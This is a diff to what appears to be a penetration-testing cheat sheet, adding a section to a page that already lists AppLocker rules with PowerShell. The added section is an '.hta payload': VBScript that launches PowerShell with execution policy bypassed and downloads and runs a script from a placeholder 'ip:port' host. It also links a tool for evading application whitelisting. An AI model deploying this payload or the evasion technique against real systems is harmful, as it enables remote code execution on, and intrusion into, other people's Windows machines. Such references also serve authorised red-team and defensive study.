@@ -104,6 +104,24 @@ Write-Output "[+] Printing Applocker Rules [+]`n"
     Write-Output ($_.FilePublisherRule | Where-Object {$_.Name -NotLike "(Default Rule)*"}) | ForEach-Object -Process {Write-Output "=== File Publisher Rule ===`n`n Rule Name : $($_.Name) `n PublisherName : $($_.Conditions.FilePublisherCondition.PublisherName) `n ProductName : $($_.Conditions.FilePublisherCondition.ProductName) `n BinaryName : $($_.Conditions.FilePublisherCondition.BinaryName) `n BinaryVersion Min. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.LowSection) `n BinaryVersion Max. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.HighSection) `n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
 }
 ```
+#### .hta payload
+```
+<HTML> 
+<HEAD> 
+<script language="VBScript">
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')"
+</script>
+</HEAD> 
+<BODY> 
+</BODY> 
+</HTML>
+```
+#### Whitelist Invasion - Installutil.py
+```
+https://github.com/khr0x40sh/WhiteListEvasion
+```
+
 ## Poisoning Attack
 
 #### Responder
